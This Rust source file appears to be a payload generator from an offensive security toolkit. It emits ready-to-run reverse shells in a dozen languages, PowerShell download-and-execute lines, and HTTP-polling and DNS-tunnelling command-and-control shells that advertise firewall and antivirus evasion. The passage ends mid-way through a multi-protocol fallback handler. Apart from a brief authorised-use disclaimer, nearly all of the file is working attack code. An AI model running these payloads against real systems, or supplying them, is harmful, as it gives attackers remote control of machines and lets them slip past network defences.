//! Exploit Payloads Generator
//!
//! ZERO DEPENDENCIES - Pure Rust payload generation
//!
//! **What Does This Do?**
//! Generates common exploit payloads for penetration testing:
//! - Reverse shells (Bash, Python, PHP, PowerShell, etc.)
//! - Bind shells
//! - Web shells
//! - Privilege escalation payloads
//!
//! **AUTHORIZED USE ONLY**:
//! Use ONLY for authorized penetration testing, CTFs, or educational purposes.
//!
//! **Works alongside**:
//! - Metasploit msfvenom
//! - PentestMonkey reverse shell cheatsheet
//! - RevShells.com
//! - PayloadsAllTheThings

/// Payload type
#[derive(Debug, Clone, PartialEq)]
pub enum PayloadType {
    ReverseShell,
    BindShell,
    WebShell,
    PrivEsc,
}

/// Shell type
#[derive(Debug, Clone, PartialEq)]
pub enum ShellType {
    Bash,
    Python,
    Perl,
    PHP,
    Ruby,
    Netcat,
    PowerShell,
    Socat,
    Awk,
    Java,
    Node,
}

impl ShellType {
    pub fn as_str(&self) -> &str {
        match self {
            ShellType::Bash => "bash",
            ShellType::Python => "python",
            ShellType::Perl => "perl",
            ShellType::PHP => "php",
            ShellType::Ruby => "ruby",
            ShellType::Netcat => "netcat",
            ShellType::PowerShell => "powershell",
            ShellType::Socat => "socat",
            ShellType::Awk => "awk",
            ShellType::Java => "java",
            ShellType::Node => "nodejs",
        }
    }
}

/// Payload configuration
#[derive(Debug, Clone)]
pub struct PayloadConfig {
    pub lhost: String, // Attacker's IP
    pub lport: u16,    // Attacker's listening port
}

/// Multi-handler configuration (TCP → HTTP → DNS fallback)
pub struct MultiHandlerConfig {
    pub lhost: String,              // Attacker's IP
    pub tcp_port: u16,              // TCP port (default: 4444)
    pub http_port: u16,             // HTTP port (default: 8080)
    pub dns_domain: Option<String>, // DNS domain for tunneling (optional)
}

/// Payload generator
pub struct PayloadGenerator;

impl PayloadGenerator {
    /// Generate reverse shell payload
    ///
    /// **USAGE**:
    /// 1. Start listener: `nc -lvnp 4444`
    /// 2. Execute payload on target
    /// 3. Get shell on listener
    pub fn generate_reverse_shell(shell_type: ShellType, config: &PayloadConfig) -> String {
        match shell_type {
            ShellType::Bash => Self::bash_reverse_shell(config),
            ShellType::Python => Self::python_reverse_shell(config),
            ShellType::Perl => Self::perl_reverse_shell(config),
            ShellType::PHP => Self::php_reverse_shell(config),
            ShellType::Ruby => Self::ruby_reverse_shell(config),
            ShellType::Netcat => Self::netcat_reverse_shell(config),
            ShellType::PowerShell => Self::powershell_reverse_shell(config),
            ShellType::Socat => Self::socat_reverse_shell(config),
            ShellType::Awk => Self::awk_reverse_shell(config),
            ShellType::Java => Self::java_reverse_shell(config),
            ShellType::Node => Self::node_reverse_shell(config),
        }
    }

    /// Bash reverse shell
    fn bash_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"bash -i >& /dev/tcp/{}/{} 0>&1

# Alternative methods:
# Method 1: Bash TCP
bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'

# Method 2: Exec redirect
0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196

# Method 3: Named pipe (mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f

# Method 4: Telnet
TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | /bin/sh 1>$TF
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
        )
    }

    /// Python reverse shell
    fn python_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Python reverse shell

# Method 1: Socket (Python 3)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Method 2: Socket (Python 2)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Method 3: One-liner with pty
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{}",{}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Method 4: Windows-compatible
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# Method 5: IPv6
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("{}",{},0,0));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
        )
    }

    /// Perl reverse shell
    fn perl_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Perl reverse shell

perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'

# Alternative (no /bin/sh):
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
"#,
            config.lhost, config.lport, config.lhost, config.lport,
        )
    }

    /// PHP reverse shell
    fn php_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# PHP reverse shell

<?php
// Method 1: exec
$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");
?>

<?php
// Method 2: shell_exec
$sock=fsockopen("{}",{});shell_exec("/bin/sh -i <&3 >&3 2>&3");
?>

<?php
// Method 3: system
$sock=fsockopen("{}",{});system("/bin/sh -i <&3 >&3 2>&3");
?>

<?php
// Method 4: passthru
$sock=fsockopen("{}",{});passthru("/bin/sh -i <&3 >&3 2>&3");
?>

<?php
// Method 5: Full reverse shell (PentestMonkey)
set_time_limit(0);
$ip = '{}';
$port = {};
$sock = fsockopen($ip, $port);
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
if (is_resource($process)) {{
    fwrite($pipes[0], "");
    fclose($pipes[0]);
    while ($s = fgets($sock)) {{
        fwrite($pipes[0], $s);
        $s = stream_get_contents($pipes[1]);
        fwrite($sock, $s);
    }}
    fclose($sock);
    proc_close($process);
}}
?>

# One-liner:
php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
        )
    }

    /// Ruby reverse shell
    fn ruby_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Ruby reverse shell

ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Alternative:
ruby -rsocket -e'exit if fork;c=TCPSocket.new("{}","{}");loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts "failed: #{{$_}}"}}'
"#,
            config.lhost, config.lport, config.lhost, config.lport,
        )
    }

    /// Netcat reverse shell
    fn netcat_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Netcat reverse shell

# Traditional nc
nc -e /bin/sh {} {}

# nc without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f

# nc.traditional
nc.traditional -e /bin/bash {} {}

# ncat (nmap version)
ncat {} {} -e /bin/bash

# ncat with SSL
ncat --ssl {} {} -e /bin/bash

# OpenBSD nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f

# BusyBox nc
busybox nc {} {} -e /bin/sh
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
        )
    }

    /// PowerShell reverse shell (Windows)
    fn powershell_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# PowerShell reverse shell

# Method 1: Simple TCP client
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()

# Method 2: Base64 encoded (evades some AVs)
powershell -e <base64_encoded_payload>

# Method 3: Download and execute
powershell IEX(New-Object Net.WebClient).downloadString('http://{}/shell.ps1')

# Method 4: Nishang reverse shell
powershell IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {} -Port {}

# Listener command:
# nc -lvnp {}
"#,
            config.lhost, config.lport, config.lhost, config.lhost, config.lport, config.lport,
        )
    }

    /// Socat reverse shell
    fn socat_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Socat reverse shell

# Linux
socat tcp-connect:{}:{} exec:/bin/sh,pty,stderr,setsid,sigint,sane

# Windows
socat tcp-connect:{}:{} exec:'cmd.exe',pipes

# Encrypted (SSL/TLS)
socat openssl-connect:{}:{},verify=0 exec:/bin/sh,pty,stderr,setsid,sigint,sane

# Listener (attacker):
socat TCP-LISTEN:{} -

# Encrypted listener:
# Generate certificate first:
# openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
# cat bind_shell.key bind_shell.crt > bind_shell.pem
socat OPENSSL-LISTEN:{},cert=bind_shell.pem,verify=0,fork STDOUT
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lport,
            config.lport,
        )
    }

    /// AWK reverse shell
    fn awk_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# AWK reverse shell

awk 'BEGIN {{s = "/inet/tcp/0/{}/{}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null
"#,
            config.lhost, config.lport,
        )
    }

    /// Java reverse shell
    fn java_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"// Java reverse shell

public class RevShell {{
    public static void main(String[] args) throws Exception {{
        Runtime r = Runtime.getRuntime();
        Process p = r.exec(new String[]{{"/bin/bash","-c","exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done"}});
        p.waitFor();
    }}
}}

// Compile: javac RevShell.java
// Execute: java RevShell

// One-liner (if Runtime.exec available):
r = Runtime.getRuntime(); p = r.exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{}/{} 0>&1"}}); p.waitFor();
"#,
            config.lhost, config.lport, config.lhost, config.lport,
        )
    }

    /// Node.js reverse shell
    fn node_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"// Node.js reverse shell

(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({}, "{}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();

// One-liner:
node -e 'require("child_process").exec("nc -e /bin/sh {} {}")'

// Alternative:
require('child_process').exec('bash -i >& /dev/tcp/{}/{} 0>&1');
"#,
            config.lport, config.lhost, config.lhost, config.lport, config.lhost, config.lport,
        )
    }

    /// Generate HTTP reverse shell (polling-based, firewall bypass)
    ///
    /// **WHY HTTP?**
    /// - Bypasses 80% of firewalls (HTTP/HTTPS usually allowed)
    /// - Works through proxies
    /// - Stealth (looks like normal web traffic)
    ///
    /// **USAGE**:
    /// 1. Start HTTP listener: `rb exploit payload start --port 8080 --type http`
    /// 2. Execute payload on target
    /// 3. Target will poll listener for commands
    pub fn generate_http_reverse_shell(shell_type: ShellType, config: &PayloadConfig) -> String {
        match shell_type {
            ShellType::Bash => Self::bash_http_reverse_shell(config),
            ShellType::Python => Self::python_http_reverse_shell(config),
            ShellType::PowerShell => Self::powershell_http_reverse_shell(config),
            ShellType::PHP => Self::php_http_reverse_shell(config),
            _ => format!(
                "# HTTP reverse shell not yet implemented for {:?}\n# Use: python, bash, powershell, or php",
                shell_type
            ),
        }
    }

    /// Bash HTTP reverse shell
    fn bash_http_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"#!/bin/bash
# HTTP Polling Reverse Shell - Bash

LHOST="{}"
LPORT={}
URL="http://$LHOST:$LPORT"

# Register session
SESSION_ID=$(curl -s "$URL/register")
echo "[*] Registered as session $SESSION_ID"

# Polling loop
while true; do
    # Get command from server
    CMD=$(curl -s "$URL/cmd/$SESSION_ID")

    if [ "$CMD" != "sleep 5" ]; then
        echo "[*] Executing: $CMD"

        # Execute command and capture output
        OUTPUT=$(eval "$CMD" 2>&1)

        # Send output back
        curl -s -X POST "$URL/output/$SESSION_ID" -d "$OUTPUT"
    fi

    sleep 5
done
"#,
            config.lhost, config.lport
        )
    }

    /// Python HTTP reverse shell
    fn python_http_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"#!/usr/bin/env python3
# HTTP Polling Reverse Shell - Python

import urllib.request
import subprocess
import time

LHOST = "{}"
LPORT = {}
URL = f"http://{{LHOST}}:{{LPORT}}"

# Register session
response = urllib.request.urlopen(f"{{URL}}/register")
session_id = response.read().decode()
print(f"[*] Registered as session {{session_id}}")

# Polling loop
while True:
    try:
        # Get command
        response = urllib.request.urlopen(f"{{URL}}/cmd/{{session_id}}")
        cmd = response.read().decode().strip()

        if cmd != "sleep 5":
            print(f"[*] Executing: {{cmd}}")

            # Execute command
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)

            # Send output back
            req = urllib.request.Request(
                f"{{URL}}/output/{{session_id}}",
                data=output,
                method='POST'
            )
            urllib.request.urlopen(req)

        time.sleep(5)
    except Exception as e:
        print(f"[-] Error: {{e}}")
        time.sleep(10)
"#,
            config.lhost, config.lport
        )
    }

    /// PowerShell HTTP reverse shell
    fn powershell_http_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# HTTP Polling Reverse Shell - PowerShell

$LHOST = "{}"
$LPORT = {}
$URL = "http://$($LHOST):$($LPORT)"

# Register session
$SessionId = (Invoke-WebRequest -Uri "$URL/register" -UseBasicParsing).Content
Write-Host "[*] Registered as session $SessionId"

# Polling loop
while ($true) {{
    try {{
        # Get command
        $Cmd = (Invoke-WebRequest -Uri "$URL/cmd/$SessionId" -UseBasicParsing).Content

        if ($Cmd -ne "sleep 5") {{
            Write-Host "[*] Executing: $Cmd"

            # Execute command
            $Output = Invoke-Expression $Cmd 2>&1 | Out-String

            # Send output back
            Invoke-WebRequest -Uri "$URL/output/$SessionId" `
                -Method POST `
                -Body $Output `
                -UseBasicParsing | Out-Null
        }}

        Start-Sleep -Seconds 5
    }} catch {{
        Write-Host "[-] Error: $_"
        Start-Sleep -Seconds 10
    }}
}}
"#,
            config.lhost, config.lport
        )
    }

    /// PHP HTTP reverse shell
    fn php_http_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"<?php
// HTTP Polling Reverse Shell - PHP

$LHOST = "{}";
$LPORT = {};
$URL = "http://$LHOST:$LPORT";

// Register session
$session_id = file_get_contents("$URL/register");
echo "[*] Registered as session $session_id\n";

// Polling loop
while (true) {{
    // Get command
    $cmd = file_get_contents("$URL/cmd/$session_id");

    if ($cmd != "sleep 5") {{
        echo "[*] Executing: $cmd\n";

        // Execute command
        $output = shell_exec($cmd);

        // Send output back
        $opts = array(
            'http' => array(
                'method' => 'POST',
                'content' => $output
            )
        );
        $context = stream_context_create($opts);
        file_get_contents("$URL/output/$session_id", false, $context);
    }}

    sleep(5);
}}
?>
"#,
            config.lhost, config.lport
        )
    }

    /// Generate DNS tunneling reverse shell (99% firewall bypass!)
    ///
    /// DNS tunneling works by encoding commands in DNS queries and responses.
    /// Since DNS traffic is almost never blocked, this bypasses 99% of firewalls.
    ///
    /// Architecture:
    /// 1. Target sends DNS query: <session_id>.<random>.attacker.com → TXT?
    /// 2. DNS server responds with TXT record containing base64 command
    /// 3. Target executes command
    /// 4. Target sends output via DNS queries (chunked in subdomains)
    /// 5. DNS server collects output from subdomain queries
    pub fn generate_dns_reverse_shell(shell_type: ShellType, config: &PayloadConfig) -> String {
        match shell_type {
            ShellType::Bash => Self::bash_dns_reverse_shell(config),
            ShellType::Python => Self::python_dns_reverse_shell(config),
            ShellType::PowerShell => Self::powershell_dns_reverse_shell(config),
            ShellType::PHP => Self::php_dns_reverse_shell(config),
            _ => format!("# DNS tunneling not yet implemented for {:?}", shell_type),
        }
    }

    /// Bash DNS tunneling reverse shell
    fn bash_dns_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"#!/bin/bash
# DNS Tunneling Reverse Shell - Bash
# Domain: {domain}
# Bypasses 99% of firewalls!

DOMAIN="{domain}"
SESSION_ID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)

# Base64 encode/decode helpers
b64_encode() {{ echo -n "$1" | base64 | tr '+/' '-_' | tr -d '='; }}
b64_decode() {{ echo -n "$1" | tr '_-' '/+' | base64 -d 2>/dev/null; }}

# Send data via DNS query (chunked)
dns_send() {{
    local data="$1"
    local encoded=$(b64_encode "$data")
    # Chunk into 63 byte labels (DNS label max)
    local chunk_size=60
    local i=0
    while [ $i -lt ${{#encoded}} ]; do
        local chunk="${{encoded:$i:$chunk_size}}"
        dig +short "$chunk.$SESSION_ID.$DOMAIN" TXT @8.8.8.8 >/dev/null 2>&1
        i=$((i + chunk_size))
    done
}}

# Get command via DNS TXT query
dns_recv() {{
    local response=$(dig +short "cmd.$SESSION_ID.$DOMAIN" TXT @8.8.8.8 | tr -d '"')
    b64_decode "$response"
}}

# Register session
dig +short "register.$SESSION_ID.$DOMAIN" TXT @8.8.8.8 >/dev/null 2>&1

# Main loop
while true; do
    # Get command from DNS
    cmd=$(dns_recv)

    if [ -n "$cmd" ] && [ "$cmd" != "sleep" ]; then
        # Execute command
        output=$(eval "$cmd" 2>&1)

        # Send output back via DNS
        dns_send "$output"
    fi

    sleep 5
done
"#,
            domain = config.lhost // lhost is used as domain for DNS
        )
    }

    /// Python DNS tunneling reverse shell
    fn python_dns_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"#!/usr/bin/env python3
# DNS Tunneling Reverse Shell - Python
# Domain: {domain}
# Bypasses 99% of firewalls!

import socket
import subprocess
import base64
import random
import string
import time

DOMAIN = "{domain}"
DNS_SERVER = "8.8.8.8"
SESSION_ID = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def b64_encode(data):
    """Base64 encode and make DNS-safe"""
    return base64.b64encode(data.encode()).decode().replace('+', '-').replace('/', '_').replace('=', '')

def b64_decode(data):
    """Decode DNS-safe base64"""
    data = data.replace('-', '+').replace('_', '/')
    # Add padding
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    try:
        return base64.b64decode(data).decode()
    except:
        return ""

def dns_query(domain, qtype='TXT'):
    """Perform DNS query"""
    try:
        # Build DNS query manually
        query = bytearray()
        # Transaction ID
        query.extend((random.randint(0, 65535)).to_bytes(2, 'big'))
        # Flags: standard query
        query.extend(b'\x01\x00')
        # Questions: 1
        query.extend(b'\x00\x01')
        # Answer, Authority, Additional: 0
        query.extend(b'\x00\x00\x00\x00\x00\x00')

        # Encode domain
        for label in domain.split('.'):
            query.append(len(label))
            query.extend(label.encode())
        query.append(0)

        # Type TXT (16) and Class IN (1)
        query.extend(b'\x00\x10\x00\x01')

        # Send query
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        sock.sendto(query, (DNS_SERVER, 53))

        # Receive response
        response, _ = sock.recvfrom(512)
        sock.close()

        # Parse TXT record from response (simplified)
        # Skip header (12 bytes) + question section
        offset = 12
        # Skip question
        while offset < len(response) and response[offset] != 0:
            offset += response[offset] + 1
        offset += 5  # null + type + class

        # Parse answer
        if offset + 10 < len(response):
            # Skip name pointer (2 bytes), type (2), class (2), ttl (4)
            offset += 10
            data_len = int.from_bytes(response[offset:offset+2], 'big')
            offset += 2
            txt_len = response[offset]
            offset += 1
            txt_data = response[offset:offset+txt_len].decode('utf-8', errors='ignore')
            return txt_data

        return ""
    except:
        return ""

def dns_send(data):
    """Send data via DNS queries (chunked)"""
    encoded = b64_encode(data)
    chunk_size = 60  # DNS label max is 63 bytes

    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i+chunk_size]
        query_domain = f"{{chunk}}.{{SESSION_ID}}.{{DOMAIN}}"
        dns_query(query_domain, 'TXT')
        time.sleep(0.1)  # Small delay between chunks

def dns_recv():
    """Get command via DNS TXT query"""
    query_domain = f"cmd.{{SESSION_ID}}.{{DOMAIN}}"
    response = dns_query(query_domain, 'TXT')
    return b64_decode(response)

# Register session
dns_query(f"register.{{SESSION_ID}}.{{DOMAIN}}", 'TXT')

# Main loop
while True:
    try:
        # Get command from DNS
        cmd = dns_recv()

        if cmd and cmd != "sleep":
            # Execute command
            try:
                output = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                result = output.stdout + output.stderr
            except subprocess.TimeoutExpired:
                result = "Command timed out"
            except Exception as e:
                result = f"Error: {{str(e)}}"

            # Send output back via DNS
            if result:
                dns_send(result)

        time.sleep(5)
    except KeyboardInterrupt:
        break
    except Exception as e:
        time.sleep(5)
        continue
"#,
            domain = config.lhost // lhost is used as domain for DNS
        )
    }

    /// PowerShell DNS tunneling reverse shell
    fn powershell_dns_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# DNS Tunneling Reverse Shell - PowerShell
# Domain: {domain}
# Bypasses 99% of firewalls!

$DOMAIN = "{domain}"
$DNS_SERVER = "8.8.8.8"
$SESSION_ID = -join ((97..122) + (48..57) | Get-Random -Count 8 | ForEach-Object {{[char]$_}})

function B64-Encode($text) {{
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
    $encoded = [Convert]::ToBase64String($bytes)
    return $encoded.Replace('+', '-').Replace('/', '_').Replace('=', '')
}}

function B64-Decode($text) {{
    $text = $text.Replace('-', '+').Replace('_', '/')
    $padding = 4 - ($text.Length % 4)
    if ($padding -ne 4) {{ $text += '=' * $padding }}
    try {{
        $bytes = [Convert]::FromBase64String($text)
        return [System.Text.Encoding]::UTF8.GetString($bytes)
    }} catch {{
        return ""
    }}
}}

function DNS-Query($domain) {{
    try {{
        $result = Resolve-DnsName -Name $domain -Type TXT -Server $DNS_SERVER -ErrorAction SilentlyContinue
        if ($result -and $result.Strings) {{
            return $result.Strings -join ''
        }}
        return ""
    }} catch {{
        return ""
    }}
}}

function DNS-Send($data) {{
    $encoded = B64-Encode $data
    $chunkSize = 60

    for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {{
        $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
        $queryDomain = "$chunk.$SESSION_ID.$DOMAIN"
        DNS-Query $queryDomain | Out-Null
        Start-Sleep -Milliseconds 100
    }}
}}

function DNS-Recv {{
    $queryDomain = "cmd.$SESSION_ID.$DOMAIN"
    $response = DNS-Query $queryDomain
    return B64-Decode $response
}}

# Register session
DNS-Query "register.$SESSION_ID.$DOMAIN" | Out-Null

# Main loop
while ($true) {{
    try {{
        # Get command from DNS
        $cmd = DNS-Recv

        if ($cmd -and $cmd -ne "sleep") {{
            # Execute command
            try {{
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            }} catch {{
                $output = "Error: $_"
            }}

            # Send output back via DNS
            if ($output) {{
                DNS-Send $output
            }}
        }}

        Start-Sleep -Seconds 5
    }} catch {{
        Start-Sleep -Seconds 5
        continue
    }}
}}
"#,
            domain = config.lhost // lhost is used as domain for DNS
        )
    }

    /// PHP DNS tunneling reverse shell
    fn php_dns_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"<?php
// DNS Tunneling Reverse Shell - PHP
// Domain: {domain}
// Bypasses 99% of firewalls!

$DOMAIN = "{domain}";
$DNS_SERVER = "8.8.8.8";
$SESSION_ID = bin2hex(random_bytes(4));

function b64_encode_safe($data) {{
    return str_replace(array('+', '/', '='), array('-', '_', ''), base64_encode($data));
}}

function b64_decode_safe($data) {{
    $data = str_replace(array('-', '_'), array('+', '/'), $data);
    $padding = 4 - (strlen($data) % 4);
    if ($padding != 4) $data .= str_repeat('=', $padding);
    return base64_decode($data);
}}

function dns_query($domain) {{
    global $DNS_SERVER;
    $result = dns_get_record($domain, DNS_TXT);
    if ($result && isset($result[0]['txt'])) {{
        return $result[0]['txt'];
    }}
    return "";
}}

function dns_send($data) {{
    global $DOMAIN, $SESSION_ID;
    $encoded = b64_encode_safe($data);
    $chunkSize = 60;

    for ($i = 0; $i < strlen($encoded); $i += $chunkSize) {{
        $chunk = substr($encoded, $i, $chunkSize);
        $queryDomain = "$chunk.$SESSION_ID.$DOMAIN";
        dns_query($queryDomain);
        usleep(100000); // 100ms
    }}
}}

function dns_recv() {{
    global $DOMAIN, $SESSION_ID;
    $queryDomain = "cmd.$SESSION_ID.$DOMAIN";
    $response = dns_query($queryDomain);
    return b64_decode_safe($response);
}}

// Register session
dns_query("register.$SESSION_ID.$DOMAIN");

// Main loop
while (true) {{
    try {{
        // Get command from DNS
        $cmd = dns_recv();

        if (!empty($cmd) && $cmd != "sleep") {{
            // Execute command
            ob_start();
            system($cmd . " 2>&1");
            $output = ob_get_clean();

            // Send output back via DNS
            if (!empty($output)) {{
                dns_send($output);
            }}
        }}

        sleep(5);
    }} catch (Exception $e) {{
        sleep(5);
        continue;
    }}
}}
?>
"#,
            domain = config.lhost // lhost is used as domain for DNS
        )
    }

    /// Generate Multi-Handler reverse shell (tries TCP → HTTP → DNS with fallback)
    ///
    /// This creates a resilient payload that tries multiple protocols in order:
    /// 1. TCP first (fastest, port 4444)
    /// 2. HTTP if TCP fails (firewall bypass, port 8080)
    /// 3. DNS if HTTP fails (maximum bypass, port 53)
    ///
    /// Ensures maximum success rate - if one protocol is blocked, try the next.
    pub fn generate_multi_handler(shell_type: ShellType, config: &MultiHandlerConfig) -> String {
        match shell_type {
            ShellType::Python => Self::python_multi_handler(config),
            ShellType::Bash => Self::bash_multi_handler(config),
            ShellType::PowerShell => Self::powershell_multi_handler(config),
            _ => format!("# Multi-handler not yet implemented for {:?}", shell_type),
        }
    }

    /// Python multi-handler reverse shell
    fn python_multi_handler(config: &MultiHandlerConfig) -> String {
        format!(
            r#"#!/usr/bin/env python3
# Multi-Handler Reverse Shell - Python
# Tries: TCP → HTTP → DNS (automatic fallback)
# Maximum reliability and firewall bypass!

import socket
import subprocess
import time
import urllib.request
import base64
import random
import string

LHOST = "{lhost}"
TCP_PORT = {tcp_port}
HTTP_PORT = {http_port}
DNS_DOMAIN = "{dns_domain}"

def try_tcp():
    """Try TCP reverse shell (fastest)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((LHOST, TCP_PORT))

        # Send initial banner
        s.send(b"[*] TCP reverse shell connected\\n")

        while True:
            # Receive command
            data = s.recv(4096)
            if not data:
                break

            cmd = data.decode().strip()
            if cmd.lower() in ['exit', 'quit']:
                break

            # Execute command
            try:
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                result = output.stdout + output.stderr
            except Exception as e:
                result = f"Error: {{str(e)}}\\n"

            # Send output
            s.send(result.encode())

        s.close()
        return True
    except Exception as e:
        print(f"[!] TCP failed: {{e}}")
        return False

def try_http():
    """Try HTTP reverse shell (firewall bypass)"""
    try:
        # Register session
        session_id = urllib.request.urlopen(
            f"http://{{LHOST}}:{{HTTP_PORT}}/register",
            timeout=5
        ).read().decode().strip()

        print(f"[*] HTTP session registered: {{session_id}}")

        while True:
            # Poll for command
            cmd = urllib.request.urlopen(
                f"http://{{LHOST}}:{{HTTP_PORT}}/cmd/{{session_id}}",
                timeout=5
            ).read().decode().strip()

            if cmd and cmd != "sleep 5":
                # Execute command
                try:
                    output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                    result = output.stdout + output.stderr
                except Exception as e:
                    result = f"Error: {{str(e)}}"

                # Send output
                urllib.request.urlopen(
                    f"http://{{LHOST}}:{{HTTP_PORT}}/output/{{session_id}}",
                    data=result.encode(),
                    timeout=5
                )

            time.sleep(5)

        return True
    except Exception as e:
        print(f"[!] HTTP failed: {{e}}")
        return False

def try_dns():
    """Try DNS tunneling (maximum firewall bypass)"""
    try:
        SESSION_ID = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

        def b64_encode(data):
